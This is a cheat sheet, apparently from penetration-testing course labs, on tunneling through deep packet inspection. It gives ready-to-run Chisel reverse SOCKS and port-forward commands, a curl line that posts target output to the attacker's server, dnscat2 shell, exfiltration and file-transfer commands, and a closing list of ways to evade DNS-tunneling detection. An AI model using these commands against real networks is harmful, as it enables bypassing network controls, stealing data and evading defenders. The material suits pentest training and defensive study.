# Tunneling Through Deep Packet Inspection - Cheat Sheet & Walkthrough

## Table of Contents
1. [HTTP Tunneling with Chisel](#1-http-tunneling-with-chisel)
2. [DNS Tunneling Fundamentals](#2-dns-tunneling-fundamentals)
3. [DNS Tunneling with dnscat2](#3-dns-tunneling-with-dnscat2)
4. [Quick Reference](#4-quick-reference)

---

## 1. HTTP Tunneling with Chisel

### 1.1 Why HTTP Tunneling?

Deep Packet Inspection (DPI) solutions can:
- Terminate non-HTTP traffic (SSH, etc.)
- Block all inbound ports except HTTP/HTTPS
- Require traffic to conform to HTTP format

**Solution**: Encapsulate traffic within HTTP using tools like Chisel.

### 1.2 Chisel Overview

| Feature | Description |
|---------|-------------|
| **Protocol** | HTTP WebSockets |
| **Encryption** | SSH encryption within tunnel |
| **Cross-platform** | Linux, macOS, Windows |
| **Architectures** | amd64, arm, arm64, 386 |

### 1.3 Chisel Setup

#### Server Mode (Kali)
```bash
chisel server --port 8080 --reverse
```

**Flags**:
- `--port`: Listening port
- `--reverse`: Enable reverse tunneling (client connects to server)

#### Client Mode (Target)
```bash
chisel client SERVER_IP:PORT R:socks
```

**Options**:
- `R:socks`: Reverse SOCKS proxy (port 1080 default)
- `R:PORT:IP:PORT`: Reverse port forward

### 1.4 Troubleshooting Chisel

#### Common Error: GLIBC Version Mismatch
```
/lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found
```

**Solution**: Use older Chisel version compiled with Go 1.19.

```bash
# Download older version
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
```

#### Redirecting Output for Debugging
```bash
/tmp/chisel client SERVER_IP:PORT R:socks &> /tmp/output
curl --data @/tmp/output http://SERVER_IP:PORT/
```

### 1.5 Using Chisel with SSH

#### ProxyCommand with Ncat
```bash
# Install ncat
sudo apt install ncat

# SSH through SOCKS proxy
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@target
```

### 1.6 Chisel Command Reference

| Command | Purpose |
|---------|---------|
| `chisel server --port PORT --reverse` | Start server with reverse tunneling |
| `chisel client IP:PORT R:socks` | Connect and create reverse SOCKS proxy |
| `chisel client IP:PORT R:LPORT:DEST_IP:DPORT` | Reverse port forward |
| `chisel client IP:PORT L:LPORT:DEST_IP:DPORT` | Local port forward |

---

## 2. DNS Tunneling Fundamentals

### 2.1 How DNS Resolution Works

```
1. Client → Recursive Resolver
2. Recursive Resolver → Root Name Server (.com TLD)
3. Root Server → TLD Name Server
4. Recursive Resolver → Authoritative Name Server
5. Authoritative Server → A/TXT/MX Record Response
```

### 2.2 DNS Record Types for Tunneling

| Record | Purpose | Tunneling Use |
|--------|---------|---------------|
| **A** | IPv4 address | Exfiltrate data via subdomains |
| **TXT** | Arbitrary text | Infiltrate data (response) |
| **MX** | Mail exchange | Exfiltrate data |
| **CNAME** | Canonical name | Exfiltrate/Infiltrate data |

### 2.3 DNS Exfiltration

**Concept**: Encode data in subdomain queries.

```
[hex-encoded-chunk].feline.corp
```

**Example Flow**:
```
1. PGDATABASE01 queries: data-chunk-1.feline.corp
2. MULTISERVER03 forwards to FELINEAUTHORITY
3. FELINEAUTHORITY logs the query
4. Repeat for all chunks
```

### 2.4 DNS Infiltration

**Concept**: Use TXT records to deliver data.

```bash
# Dnsmasq TXT record
txt-record=www.feline.corp,here's something useful!
```

**Client Retrieval**:
```bash
nslookup -type=txt www.feline.corp
```

### 2.5 Setting Up Dnsmasq

#### Basic Dnsmasq Configuration
```bash
# dnsmasq.conf
no-resolv
no-hosts
auth-zone=feline.corp
auth-server=feline.corp
```

#### Start Dnsmasq
```bash
sudo dnsmasq -C dnsmasq.conf -d
```

#### TXT Record Configuration
```bash
# dnsmasq_txt.conf
no-resolv
no-hosts
auth-zone=feline.corp
auth-server=feline.corp
txt-record=www.feline.corp,here's something useful!
```

---

## 3. DNS Tunneling with dnscat2

### 3.1 dnscat2 Overview

| Feature | Description |
|---------|-------------|
| **Protocol** | DNS (TXT, CNAME, MX records) |
| **Encryption** | Encrypted sessions |
| **Port Forwarding** | Yes (listen command) |
| **Interactive Shell** | Yes (shell command) |

### 3.2 dnscat2 Server Setup

```bash
# Start server
dnscat2-server feline.corp

# Output includes secret for client
# ./dnscat --secret=SECRET feline.corp
```

**Session Security**:
- Authentication string displayed on both client/server
- Verify to prevent MITM attacks

### 3.3 dnscat2 Client Setup

```bash
# Run client
./dnscat feline.corp

# Or with secret
./dnscat --secret=SECRET feline.corp
```

**Note**: Client must be able to make DNS queries to the domain.

### 3.4 dnscat2 Commands

#### Server Commands
```
windows              # List active windows
window -i ID         # Interact with window
```

#### Session Commands
```
help                 # List all commands
shell                # Create interactive shell
ping                 # Test connection
listen LHOST:LPORT RHOST:RPORT  # Port forward
download REMOTE LOCAL          # Download file
upload LOCAL REMOTE            # Upload file
exec COMMAND         # Execute command on client
quit                 # Close session
```

### 3.5 dnscat2 Port Forwarding

```bash
# From dnscat2 session
listen 127.0.0.1:4455 172.16.2.11:445

# Now from server machine
smbclient -p 4455 -L //127.0.0.1/
```

### 3.6 DNS Tunneling Flow

```
PGDATABASE01 (Internal) → MULTISERVER03 (DNS Resolver) → FELINEAUTHORITY (Authoritative)
        ↓                           ↓                              ↓
    dnscat2 client              DNS forwarding                 dnscat2 server
        ↓                           ↓                              ↓
    Encrypted data in            Standard DNS                  Decrypt & forward
    DNS queries                  packets
```

---

## 4. Quick Reference

### 4.1 Command Comparison

| Tool | Command | Purpose |
|------|---------|---------|
| **Chisel Server** | `chisel server --port 8080 --reverse` | HTTP tunnel server |
| **Chisel Client** | `chisel client IP:8080 R:socks` | Reverse SOCKS proxy |
| **Ncat Proxy** | `ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p` | SOCKS proxy for SSH |
| **Dnsmasq** | `dnsmasq -C config.conf -d` | DNS server |
| **dnscat2 Server** | `dnscat2-server domain.corp` | DNS tunnel server |
| **dnscat2 Client** | `./dnscat domain.corp` | DNS tunnel client |

### 4.2 Tool Selection Guide

| Scenario | Recommended Tool |
|----------|------------------|
| HTTP-only outbound | Chisel |
| DNS-only outbound | dnscat2 |
| Need interactive shell | dnscat2 |
| Need SOCKS proxy | Chisel |
| Need file exfiltration | dnscat2 |
| Windows target | Chisel (cross-platform) |
| Linux target | Both work |

### 4.3 Troubleshooting Matrix

| Problem | Possible Cause | Solution |
|---------|----------------|----------|
| Chisel client fails | GLIBC version mismatch | Use older Chisel version |
| No traffic seen | Firewall blocking | Check port/Protocol |
| DNS queries fail | Wrong domain | Verify zone configuration |
| Slow tunneling | DNS latency | Expected behavior |
| Connection drops | Network timeout | Increase timeouts |

### 4.4 Key Takeaways

| Concept | Key Point |
|---------|-----------|
| **Chisel** | HTTP tunneling with SSH encryption |
| **Reverse SOCKS** | Server listens, client connects outbound |
| **DNS Tunneling** | Abuse DNS protocol for data transfer |
| **TXT Records** | Used to infiltrate data (responses) |
| **Subdomains** | Used to exfiltrate data (queries) |
| **dnscat2** | Full tunneling via DNS |
| **Authentication String** | Verify dnscat2 session integrity |
| **GLIBC Issues** | Use older versions for compatibility |

### 4.5 DNS Tunneling Detection Risks

| Detection Method | How It Works |
|------------------|--------------|
| **Volume Analysis** | Unusual number of DNS queries |
| **Subdomain Length** | Long random subdomains |
| **Record Type Mix** | Frequent TXT/CNAME/MX requests |
| **Frequency** | High-frequency queries |
| **Domain Age** | Recently registered domains |

**Countermeasures**:
- Use legitimate-looking domain names
- Limit query frequency
- Use encryption (dnscat2 does this)
- Mix with legitimate DNS traffic